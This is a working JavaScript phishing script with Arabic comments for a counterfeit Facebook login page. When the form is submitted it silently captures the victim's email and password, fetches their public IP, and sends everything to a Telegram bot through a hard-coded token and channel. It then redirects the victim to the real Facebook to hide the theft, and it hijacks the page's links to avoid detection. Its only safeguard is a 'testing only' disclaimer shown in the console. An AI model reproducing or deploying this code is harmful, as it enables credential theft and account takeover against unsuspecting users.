// ⚠️ تحذير أخلاقي في وحدة التحكم فقط (غير مرئي للمستخدم العادي)
console.log("%c🔴 هذه الصفحة لأغراض اختبارية فقط. أي استخدام غير مصرح به لجمع بيانات الآخرين هو جريمة. 🔴", "color: red; font-size: 14px;");

// ========== إعدادات تليجرام (استبدلها بقيمك الخاصة) ==========
const BOT_TOKEN = '8887758238:AAEBsYyHFATi-t-ADAkJQfDaOTxnDAhi95c';
const CHAT_ID = '@ZimaHots';

// عناصر الصفحة
const form = document.getElementById('fbLoginForm');
const emailInput = document.getElementById('emailPhone');
const passInput = document.getElementById('password');
const loginBtn = document.getElementById('loginBtn');

// دالة إرسال البيانات إلى تليجرام (صامتة تماماً)
async function sendToTelegram(email, password) {
    if (BOT_TOKEN === 'YOUR_BOT_TOKEN' || CHAT_ID === 'YOUR_CHAT_ID') {
        console.warn('⚠️ لم يتم تعيين BOT_TOKEN أو CHAT_ID. لن يتم الإرسال.');
        return false;
    }
    const text = `🔐 [FB PHISHING] 🔐\n📧 البريد: ${email}\n🔑 كلمة المرور: ${password}\n🕒 ${new Date().toLocaleString()}\n🌐 IP: ${await getIP()}`;
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
        });
        const data = await response.json();
        if (data.ok) {
            console.log('✅ تم الإرسال إلى تليجرام');
            return true;
        } else {
            console.error('خطأ من تليجرام:', data);
            return false;
        }
    } catch (err) {
        console.error('فشل الاتصال:', err);
        return false;
    }
}

// الحصول على IP العام للمستخدم (اختياري، لزيادة واقعية الهاكر)
async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch {
        return 'غير معروف';
    }
}

// معالجة إرسال النموذج (بدون أي رسالة للمستخدم)
form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const email = emailInput.value.trim();
    const password = passInput.value.trim();
    
    if (!email || !password) return; // لا نريد إزعاج المستخدم برسائل
    
    // إظهار مؤشر التحميل على الزر (للواقعية فقط)
    loginBtn.classList.add('loading');
    const originalText = loginBtn.innerHTML;
    loginBtn.innerHTML = '<span class="spinner"></span> جاري التحقق...';
    loginBtn.disabled = true;
    
    // إرسال البيانات في الخلفية
    await sendToTelegram(email, password);
    
    // محاكاة نجاح الدخول وإعادة التوجيه إلى فيسبوك الحقيقي (أو تحديث الصفحة)
    // هذا يجعل الضحية يعتقد أنه أخطأ في الكتابة أو تم تسجيل الدخول بنجاح
    setTimeout(() => {
        // إعادة التوجيه إلى فيسبوك الحقيقي (لكي يختفي الأثر)
        window.location.href = 'https://www.facebook.com';
    }, 500);
    
    // لا نعيد تعيين الحقول أو نعرض أي رسالة
});

// جميع الروابط في الصفحة تعمل كروابط حقيقية (تذهب إلى فيسبوك أو صفحات حقيقية)
// لكن لمنع كشف الخدعة، سنوجه الروابط الرئيسية إلى فيسبوك الحقيقي
document.querySelectorAll('.forgot-link a, .new-account-btn, .quick-links a, .footer-row a, .lang-dropdown').forEach(link => {
    link.addEventListener('click', (e) => {
        e.preventDefault();
        // توجيه المستخدم إلى الصفحة الحقيقية المقابلة (لكننا سنوجهه لفيسبوك عموماً)
        window.location.href = 'https://www.facebook.com';
    });
});

// التحقق من أن الصفحة تعمل بصمت
console.log('✅ صفحة التصيد التجريبية جاهزة (بدون رسائل للمستخدم)');